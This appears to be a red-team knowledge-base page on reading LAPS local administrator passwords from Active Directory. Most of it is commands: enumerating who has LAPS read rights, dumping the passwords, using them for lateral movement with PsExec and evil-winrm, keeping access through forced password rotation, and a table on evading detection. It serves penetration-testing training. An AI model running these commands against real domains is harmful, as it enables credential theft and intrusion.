# LAPS Password Reading

> **MITRE ATT&CK**: Privilege Escalation > T1555 - Credentials from Password Stores
> **Platforms**: Windows / Active Directory
> **Required Privileges**: Domain User (with LAPS read permissions)
> **OPSEC Risk**: Low

## Strategic Overview

Local Administrator Password Solution (LAPS) solves the problem of identical local admin
passwords across an environment by storing unique, randomized passwords in Active Directory.
However, LAPS introduces a new attack surface: the permissions that control who can read
these passwords. If an attacker's compromised account (or any group they belong to) has
the right to read the LAPS password attribute, they gain local administrator access to the
target machine. This is a low-OPSEC technique because reading an AD attribute is
indistinguishable from normal LDAP queries. A Red Team Lead should always enumerate LAPS
permissions as a potential lateral movement and privilege escalation vector, especially
when direct domain escalation paths are not available.

### Legacy LAPS vs. Windows LAPS

| Feature | Legacy LAPS (MS LAPS) | Windows LAPS (April 2023+) |
|---------|----------------------|---------------------------|
| Password Attribute | ms-Mcs-AdmPwd | msLAPS-Password, msLAPS-EncryptedPassword |
| Password Storage | Cleartext in AD | Cleartext or encrypted in AD |
| Encryption Support | No | Yes (via msLAPS-EncryptedPassword) |
| Password History | No | Yes (msLAPS-EncryptedPasswordHistory) |
| Azure AD Support | No | Yes |
| Managed Account | Built-in Administrator | Configurable (any local account) |

## Technical Deep-Dive

### Enumeration: Is LAPS Deployed?

```powershell
# Check if LAPS schema extensions exist
Get-ADObject "CN=ms-Mcs-AdmPwd,CN=Schema,CN=Configuration,DC=domain,DC=local" -ErrorAction SilentlyContinue
Get-ADObject "CN=ms-LAPS-Password,CN=Schema,CN=Configuration,DC=domain,DC=local" -ErrorAction SilentlyContinue

# Check which computers have LAPS enabled (have password expiration set)
Get-DomainComputer -Properties ms-Mcs-AdmPwdExpirationTime | Where-Object {$_.'ms-Mcs-AdmPwdExpirationTime' -ne $null} | Select-Object dnshostname

# Check for LAPS PowerShell module (if installed on current host)
Get-Command -Module AdmPwd.PS -ErrorAction SilentlyContinue

# Check for Windows LAPS
Get-DomainComputer -Properties msLAPS-PasswordExpirationTime | Where-Object {$_.'msLAPS-PasswordExpirationTime' -ne $null}
```

### Enumeration: Who Can Read LAPS Passwords?

```powershell
# LAPSToolkit - find groups with delegated LAPS read rights
Import-Module .\LAPSToolkit.ps1
Find-LAPSDelegatedGroups

# LAPSToolkit - find computers with LAPS and who has read access
Get-LAPSComputers

# Find-AdmPwdExtendedRights (from LAPS PowerShell module)
Import-Module AdmPwd.PS
Find-AdmPwdExtendedRights -Identity "OU=Servers,DC=domain,DC=local"

# Manual check with PowerView - find who has "All Extended Rights" on computer objects
# (AllExtendedRights includes LAPS password reading)
Get-DomainOU | ForEach-Object {
    $ou = $_.DistinguishedName
    Get-DomainObjectAcl -SearchBase $ou -ResolveGUIDs |
    Where-Object {$_.ObjectAceType -match "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty"} |
    Select-Object @{N='OU';E={$ou}}, SecurityIdentifier, ActiveDirectoryRights
}

# Check if current user can read LAPS on any computer
Get-DomainComputer -Properties ms-Mcs-AdmPwd | Where-Object {$_.'ms-Mcs-AdmPwd' -ne $null}
```

### Reading LAPS Passwords

```powershell
# --- Legacy LAPS (ms-Mcs-AdmPwd) ---

# PowerView - read LAPS password for specific computer
Get-DomainComputer -Identity TARGET -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime

# PowerView - read all readable LAPS passwords
Get-DomainComputer -Properties dnshostname, ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime |
    Where-Object {$_.'ms-Mcs-AdmPwd'} |
    Select-Object dnshostname, 'ms-Mcs-AdmPwd', 'ms-Mcs-AdmPwdExpirationTime'

# AD Module
Get-ADComputer -Identity TARGET -Properties ms-Mcs-AdmPwd | Select-Object Name, 'ms-Mcs-AdmPwd'

# LAPS PowerShell module
Get-AdmPwdPassword -ComputerName TARGET

# --- Windows LAPS (msLAPS-Password) ---

# PowerView
Get-DomainComputer -Identity TARGET -Properties msLAPS-Password
Get-DomainComputer -Identity TARGET -Properties msLAPS-EncryptedPassword

# AD Module
Get-ADComputer -Identity TARGET -Properties msLAPS-Password | Select-Object Name, 'msLAPS-Password'
```

### Reading from Linux

```bash
# CrackMapExec / NetExec - enumerate LAPS passwords across domain
crackmapexec ldap DC01.domain.local -u user -p 'password' -M laps
netexec ldap DC01.domain.local -u user -p 'password' -M laps

# CrackMapExec - specific computer
crackmapexec smb TARGET.domain.local -u user -p 'password' --laps

# pyLAPS
python3 pyLAPS.py --action get -d domain.local -u user -p 'password' --dc-ip 10.10.10.10

# ldapsearch
ldapsearch -x -H ldap://DC01.domain.local -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(ms-Mcs-AdmPwdExpirationTime=*)" ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime

# LAPSDumper
python3 laps.py -u user -p 'password' -d domain.local
```

### Using Retrieved LAPS Credentials

```powershell
# The LAPS password is for the local Administrator account (RID 500)
# Use it for local admin access on the target machine

# From Windows - PSExec / WMI
.\PsExec.exe \\TARGET -u .\Administrator -p 'LAPS_Password' cmd.exe
Enter-PSSession -ComputerName TARGET -Credential (New-Object PSCredential(".\Administrator", (ConvertTo-SecureString 'LAPS_Password' -AsPlainText -Force)))

# From Linux
crackmapexec smb TARGET -u Administrator -p 'LAPS_Password' --local-auth
psexec.py ./Administrator:'LAPS_Password'@TARGET
wmiexec.py ./Administrator:'LAPS_Password'@TARGET
evil-winrm -i TARGET -u Administrator -p 'LAPS_Password'
```

### LAPS Persistence

If you maintain access to an account that can read LAPS passwords, you have persistent
local admin access even as passwords rotate. The key is maintaining the LAPS-reading
account access.

```powershell
# Monitor password rotation schedule
Get-DomainComputer -Identity TARGET -Properties ms-Mcs-AdmPwdExpirationTime |
    Select-Object @{N='ExpirationDate';E={[DateTime]::FromFileTime($_.'ms-Mcs-AdmPwdExpirationTime')}}

# Re-read password after each rotation
# Consider setting up automated password collection if operational scope allows

# Force LAPS password reset (requires write to ms-Mcs-AdmPwdExpirationTime)
Set-DomainObject -Identity TARGET$ -Set @{'ms-Mcs-AdmPwdExpirationTime'=0}
# LAPS will reset the password at the next GPO refresh cycle
```

## Detection & Evasion

| Indicator | Detection Source | Evasion |
|-----------|-----------------|---------|
| LDAP read of ms-Mcs-AdmPwd attribute | Event 4662 (if auditing enabled for attribute access) | Attribute reads are rarely audited, low risk |
| Bulk LAPS password reading | LDAP query logs, unusual read patterns | Read selectively, only target needed machines |
| Authentication with LAPS account | Event 4624 on target host | Expected behavior for admin accounts, blends in |
| Password expiration modification | Event 5136 on computer object | Only modify if necessary, avoid unnecessary changes |

### Why LAPS Abuse is Low OPSEC

```
1. Reading an AD attribute is a standard LDAP operation
2. Many legitimate tools and processes read LAPS passwords (helpdesk, SCCM, etc.)
3. Most organizations do not audit individual attribute reads
4. No special tooling required - standard LDAP queries work
5. Does not modify any objects or trigger change events
```

## Cross-References

- [ACL Abuse](acl-abuse.md) - ReadLAPSPassword ACL edge and AllExtendedRights
- [AD Privilege Escalation Overview](ad-privilege-escalation.md) - decision tree positioning
- [Lateral Movement](../07-lateral-movement/README.md) - using LAPS credentials to move
- [Credential Access](../06-credential-access/README.md) - LAPS as credential source

## References

- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps
- https://www.thehacker.recipes/ad/movement/dacl/readlapspassword
- https://github.com/leoloobeek/LAPSToolkit
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#reading-laps-password
- https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview
